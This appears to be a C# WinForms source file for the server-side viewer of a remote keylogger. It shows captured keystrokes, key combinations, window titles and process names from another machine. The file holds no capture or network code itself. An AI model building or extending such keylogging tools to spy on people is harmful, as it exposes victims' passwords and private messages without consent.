﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Common.Networking;

namespace Server.Forms
{
    public partial class KeyLoggerForm: Form
    {
        private readonly RichTextBox _rtbRealtime = new RichTextBox { Dock = DockStyle.Fill, ReadOnly = true };
        private readonly RichTextBox _rtbContinuous = new RichTextBox { Dock = DockStyle.Fill, ReadOnly = true };
        private TabControl? _tabs;
        private TabPage? _tpRealtime;
        private TabPage? _tpContinuous;
        private readonly FlowLayoutPanel _topBar = new FlowLayoutPanel { Dock = DockStyle.Top, Height = 36, FlowDirection = FlowDirection.LeftToRight, Padding = new Padding(6) };
        private readonly Button _btnVie = new Button { Text = "VIE", Width = 60, Height = 28 };
        private readonly Button _btnEng = new Button { Text = "ENG", Width = 60, Height = 28 };

        public KeyLoggerForm()
        {
            InitializeComponent();
            InitializeUi();
            this.FormClosed += KeyLoggerForm_FormClosed;
        }

        private void KeyLoggerForm_FormClosed(object? sender, FormClosedEventArgs e)
        {
            // Notify MainServerForm to send stop (handled in MainServerForm close path)
            try
            {
                // no-op here; stop is sent by MainServerForm when closing or via menu choice
            }
            catch { }
        }

        private void InitializeUi()
        {
            _tabs = new TabControl { Dock = DockStyle.Fill };
            _tpRealtime = new TabPage("Real-time");
            _tpContinuous = new TabPage("Continuous");
            _tpRealtime.Controls.Add(_rtbRealtime);
            _tpContinuous.Controls.Add(_rtbContinuous);
            _tabs.TabPages.Add(_tpRealtime);
            _tabs.TabPages.Add(_tpContinuous);
            _topBar.Controls.Add(_btnVie);
            _topBar.Controls.Add(_btnEng);
            Controls.Add(_tabs);
            Controls.Add(_topBar);

            _btnVie.Click += (s, e) => OnLangClicked(true);
            _btnEng.Click += (s, e) => OnLangClicked(false);
        }

        public event Action<bool>? OnLanguageModeChanged; // true=VIE, false=ENG

        private void OnLangClicked(bool vie)
        {
            _btnVie.Enabled = !vie;
            _btnEng.Enabled = vie;
            OnLanguageModeChanged?.Invoke(vie);
        }

        public void AppendRealtimeKey(string s)
        {
            if (InvokeRequired) { BeginInvoke(new Action<string>(AppendRealtimeKey), s); return; }
            _rtbRealtime.AppendText(s);
        }

        public void AppendRealtimeCombo(string combo)
        {
            if (InvokeRequired) { BeginInvoke(new Action<string>(AppendRealtimeCombo), combo); return; }
            _rtbRealtime.SelectionColor = Color.Red;
            _rtbRealtime.AppendText("[" + combo + "]");
            _rtbRealtime.SelectionColor = _rtbRealtime.ForeColor;
            _rtbRealtime.SelectionStart = _rtbRealtime.TextLength;
            _rtbRealtime.ScrollToCaret();
        }

        public void AppendContinuousBatch(KeyLoggerBatch batch)
        {
            if (InvokeRequired) { BeginInvoke(new Action<KeyLoggerBatch>(AppendContinuousBatch), batch); return; }
            var header = $"{batch.Payload.TimestampUtc:yyyy-MM-dd HH:mm:ss} | {batch.Payload.WindowTitle} ({batch.Payload.ProcessName})\n";
            _rtbContinuous.SelectionFont = new Font(_rtbContinuous.Font, FontStyle.Bold);
            _rtbContinuous.AppendText(header);
            _rtbContinuous.SelectionFont = new Font(_rtbContinuous.Font, FontStyle.Regular);
            var text = batch.Payload.Text;
            AppendTextWithComboHighlight(_rtbContinuous, text);
            _rtbContinuous.AppendText("\n\n");
            _rtbContinuous.SelectionStart = _rtbContinuous.TextLength;
            _rtbContinuous.ScrollToCaret();
        }

        private static void AppendTextWithComboHighlight(RichTextBox rtb, string text)
        {
            int i = 0;
            while (i < text.Length)
            {
                int start = text.IndexOf('[', i);
                if (start < 0)
                {
                    rtb.AppendText(text.Substring(i));
                    break;
                }
                int end = text.IndexOf(']', start + 1);
                if (end < 0)
                {
                    rtb.AppendText(text.Substring(i));
                    break;
                }
                // normal part
                if (start > i)
                {
                    rtb.AppendText(text.Substring(i, start - i));
                }
                var token = text.Substring(start, end - start + 1);
                rtb.SelectionColor = Color.Red;
                rtb.AppendText(token);
                rtb.SelectionColor = rtb.ForeColor;
                i = end + 1;
            }
        }

        public void ShowRealtimeOnly()
        {
            if (InvokeRequired) { BeginInvoke(new Action(ShowRealtimeOnly)); return; }
            if (_tabs == null || _tpRealtime == null || _tpContinuous == null) return;
            _tpRealtime.Parent = _tabs;
            _tpContinuous.Parent = null;
            _tabs.SelectedTab = _tpRealtime;
            _topBar.Visible = false; // hide VIE/ENG in parallel mode
        }

        public void ShowContinuousOnly()
        {
            if (InvokeRequired) { BeginInvoke(new Action(ShowContinuousOnly)); return; }
            if (_tabs == null || _tpRealtime == null || _tpContinuous == null) return;
            _tpRealtime.Parent = null;
            _tpContinuous.Parent = _tabs;
            _tabs.SelectedTab = _tpContinuous;
            _topBar.Visible = true; // show language toggle in continuous mode
        }
    }
}
